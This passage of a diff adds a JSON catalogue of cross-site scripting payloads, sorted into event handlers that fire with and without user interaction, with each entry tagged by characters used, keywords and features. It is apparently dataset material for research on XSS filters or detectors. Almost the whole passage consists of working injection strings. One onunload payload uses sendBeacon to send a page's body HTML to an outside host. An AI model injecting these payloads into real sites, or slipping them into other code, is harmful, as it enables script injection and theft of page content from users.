+        "has_html_entities": false,
+        "payload_length": 101
+      }
+    },
+    {
+      "name": "ontoggle",
+      "description": "Fires when the details tag is expanded",
+      "tag_context": "details",
+      "payload": "<details ontoggle=alert(1) open>test</details>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "details",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 46
+      }
+    },
+    {
+      "name": "ontransitioncancel",
+      "description": "Fires when a CSS transition cancels",
+      "tag_context": "custom tags",
+      "payload": "<style>:target {color: red;}</style><xss id=x style=\"transition:color 10s\" ontransitioncancel=print()></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 108
+      }
+    },
+    {
+      "name": "ontransitionend",
+      "description": "Fires when a CSS transition ends",
+      "tag_context": "custom tags",
+      "payload": "<xss autofocus style=transition:1s ontransitionend=alert(1) tabindex=1>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 71
+      }
+    },
+    {
+      "name": "ontransitionrun",
+      "description": "Fires when a CSS transition begins",
+      "tag_context": "custom tags",
+      "payload": "<style>:target {transform: rotate(180deg);}</style><xss id=x style=\"transition:transform 2s\" ontransitionrun=print()></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "print"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 123
+      }
+    },
+    {
+      "name": "ontransitionstart",
+      "description": "Fires when a CSS transition starts",
+      "tag_context": "custom tags",
+      "payload": "<style>:target {color:red;}</style><xss id=x style=\"transition:color 1s\" ontransitionstart=alert(1)></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 106
+      }
+    },
+    {
+      "name": "onunhandledrejection",
+      "description": "Fires when a promise isn't handled",
+      "tag_context": "body",
+      "payload": "<body onunhandledrejection=alert(1)><script>fetch('//xyz')</script>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "'",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert",
+        "script"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": true,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 67
+      }
+    },
+    {
+      "name": "onunload",
+      "description": "Fires when the page is unloaded",
+      "tag_context": "body",
+      "payload": "<body onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "'",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "document",
+        "innerhtml"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 91
+      }
+    },
+    {
+      "name": "onvalidationstatuschange",
+      "description": "Fires when a form control’s validation state changes",
+      "tag_context": "geolocation",
+      "payload": "<geolocation onvalidationstatuschange=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "location"
+      ],
+      "tag_base": "geolocation",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 47
+      }
+    },
+    {
+      "name": "onwebkitanimationend",
+      "description": "Fires when a CSS animation ends",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationend=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 97
+      }
+    },
+    {
+      "name": "onwebkitanimationiteration",
+      "description": "Fires when a CSS animation repeats",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes slidein {}</style><xss style=\"animation-duration:1s;animation-name:slidein;animation-iteration- count:2\" onwebkitanimationiteration=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ";",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 167
+      }
+    },
+    {
+      "name": "onwebkitanimationstart",
+      "description": "Fires when a CSS animation starts",
+      "tag_context": "custom tags",
+      "payload": "<style>@keyframes x{}</style><xss style=\"animation-name:x\" onwebkitanimationstart=\"alert(1)\"></xss>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        "{",
+        "}",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "style",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 99
+      }
+    },
+    {
+      "name": "onwebkitneedkey",
+      "description": "Fires when an HTML media element encounters encrypted content and needs a decryption key from the page",
+      "tag_context": "audio",
+      "payload": "<audio src=data:,%23EXTM3U%0A%23EXT-X-TARGETDURATION:1%0A%23EXT-X-KEY:METHOD=AES- 128,URI=%22skd:%22%0A%23EXTINF:1%0Ax onwebkitneedkey=alert(1)></audio>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":",
+        "%"
+      ],
+      "keywords_used": [
+        "alert",
+        "data:"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [
+        "url_encoded"
+      ],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": true,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 152
+      }
+    },
+    {
+      "name": "onwebkitplaybacktargetavailabilitychanged",
+      "description": "Fires when the availability of an AirPlay playback target changes",
+      "tag_context": "audio",
+      "payload": "<audio onwebkitplaybacktargetavailabilitychanged=alert(1)>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "audio",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 58
+      }
+    },
+    {
+      "name": "onwebkittransitionend",
+      "description": "Fires when a CSS transition ends",
+      "tag_context": "custom tags",
+      "payload": "<xss style=transition:1s onwebkittransitionend=alert(1) tabindex=1 autofocus>",
+      "requires_user_interaction": false,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 77
+      }
+    }
+  ],
+  "event_handlers_with_user_interaction": [
+    {
+      "name": "onafterprint",
+      "description": "Fires after the page is printed",
+      "tag_context": "body",
+      "payload": "<body onafterprint=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert",
+        "print"
+      ],
+      "tag_base": "body",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 28
+      }
+    },
+    {
+      "name": "onauxclick",
+      "description": "Fires when right clicking or using the middle button of the mouse",
+      "tag_context": "input",
+      "payload": "<input onauxclick=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 27
+      }
+    },
+    {
+      "name": "onbeforecopy",
+      "description": "Requires you copy a piece of text",
+      "tag_context": "a",
+      "payload": "<a onbeforecopy=\"alert(1)\" contenteditable>test</a>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "a",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 51
+      }
+    },
+    {
+      "name": "onbeforecut",
+      "description": "Requires you cut a piece of text",
+      "tag_context": "a",
+      "payload": "<a onbeforecut=\"alert(1)\" contenteditable>test</a>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "a",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 50
+      }
+    },
+    {
+      "name": "onbeforeinput",
+      "description": "Fires when the value of the element is about to be modified",
+      "tag_context": "custom tags",
+      "payload": "<xss contenteditable onbeforeinput=alert(1)>test",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 48
+      }
+    },
+    {
+      "name": "onbeforepaste",
+      "description": "Fires at the end of a paste operation",
+      "tag_context": "custom tags",
+      "payload": "<xss onbeforepaste=alert(1)>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 37
+      }
+    },
+    {
+      "name": "onbeforetoggle",
+      "description": "Fires before the a popop element is toggled",
+      "tag_context": "custom tags",
+      "payload": "<button popovertarget=x>Click me</button><xss onbeforetoggle=alert(1) popover id=x>XSS</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "button",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 92
+      }
+    },
+    {
+      "name": "onblur",
+      "description": "Fires when an element loses focus",
+      "tag_context": "custom tags",
+      "payload": "<xss onblur=alert(1) id=x tabindex=1 style=display:block>test</xss><input value=clickme>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 88
+      }
+    },
+    {
+      "name": "oncancel",
+      "description": "Fires when an a file upload is cancelled",
+      "tag_context": "input",
+      "payload": "<input type=file oncancel=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 35
+      }
+    },
+    {
+      "name": "onchange",
+      "description": "Requires as change of value",
+      "tag_context": "input",
+      "payload": "<input onchange=alert(1) value=xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "input",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 35
+      }
+    },
+    {
+      "name": "onclick",
+      "description": "Requires a click of the element",
+      "tag_context": "custom tags",
+      "payload": "<xss onclick=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert",
+        "onclick"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 54
+      }
+    },
+    {
+      "name": "onclose",
+      "description": "Fires when a dialog is closed",
+      "tag_context": "dialog",
+      "payload": "<dialog open onclose=alert(1)><form method=dialog><button>XSS</button></form>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "dialog",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 77
+      }
+    },
+    {
+      "name": "oncommand",
+      "description": "Fires when the command is sent via click",
+      "tag_context": "div",
+      "payload": "<button commandfor=test command=show-popover>Click<div id=test oncommand=alert(1)>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "button",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": false,
+        "has_html_entities": false,
+        "payload_length": 82
+      }
+    },
+    {
+      "name": "oncontextmenu",
+      "description": "Triggered when right clicking to show the context menu",
+      "tag_context": "custom tags",
+      "payload": "<xss oncontextmenu=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 60
+      }
+    },
+    {
+      "name": "oncopy",
+      "description": "Requires you copy a piece of text",
+      "tag_context": "custom tags",
+      "payload": "<xss oncopy=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 78
+      }
+    },
+    {
+      "name": "oncut",
+      "description": "Requires you cut a piece of text",
+      "tag_context": "custom tags",
+      "payload": "<xss oncut=alert(1) value=\"XSS\" autofocus tabindex=1 style=display:block>test",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 77
+      }
+    },
+    {
+      "name": "ondblclick",
+      "description": "Triggered when double clicking the element",
+      "tag_context": "custom tags",
+      "payload": "<xss ondblclick=\"alert(1)\" autofocus tabindex=1 style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 78
+      }
+    },
+    {
+      "name": "ondrag",
+      "description": "Triggered dragging the element",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondrag=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 70
+      }
+    },
+    {
+      "name": "ondragend",
+      "description": "Triggered dragging is finished on the element",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondragend=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 73
+      }
+    },
+    {
+      "name": "ondragenter",
+      "description": "Requires a mouse drag",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondragenter=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 75
+      }
+    },
+    {
+      "name": "ondragexit",
+      "description": "Triggered when dragging the element",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondragexit=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 74
+      }
+    },
+    {
+      "name": "ondragleave",
+      "description": "Requires a mouse drag",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondragleave=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 75
+      }
+    },
+    {
+      "name": "ondragover",
+      "description": "Triggered dragging over an element",
+      "tag_context": "custom tags",
+      "payload": "<div draggable=\"true\" contenteditable>drag me</div><xss ondragover=alert(1) contenteditable style=display:block>drop here</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "div",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 127
+      }
+    },
+    {
+      "name": "ondragstart",
+      "description": "Requires a mouse drag",
+      "tag_context": "custom tags",
+      "payload": "<xss draggable=\"true\" ondragstart=\"alert(1)\" style=display:block>test</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 75
+      }
+    },
+    {
+      "name": "ondrop",
+      "description": "Triggered dropping a draggable element",
+      "tag_context": "custom tags",
+      "payload": "<div draggable=\"true\" contenteditable>drag me</div><xss ondrop=alert(1) contenteditable style=display:block>drop here</xss>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "\"",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "div",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 123
+      }
+    },
+    {
+      "name": "onfocusout",
+      "description": "Fires when an element loses focus",
+      "tag_context": "custom tags",
+      "payload": "<xss onfocusout=alert(1) autofocus tabindex=1 style=display:block>test</xss><input value=clickme>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
+        ">",
+        "=",
+        "(",
+        ")",
+        "/",
+        ":"
+      ],
+      "keywords_used": [
+        "alert"
+      ],
+      "tag_base": "xss",
+      "encoding_hints": [],
+      "features": {
+        "uses_backtick": false,
+        "uses_svg": false,
+        "uses_iframe": false,
+        "uses_script_tag": false,
+        "uses_data_uri": false,
+        "uses_javascript_uri": false,
+        "uses_srcdoc": false,
+        "uses_style": true,
+        "has_html_entities": false,
+        "payload_length": 97
+      }
+    },
+    {
+      "name": "onformdata",
+      "description": "Triggered when a form is submitted",
+      "tag_context": "form",
+      "payload": "<form onformdata=\"alert(1)\"><button>Click</button></form>",
+      "requires_user_interaction": true,
+      "chars_used": [
+        "<",
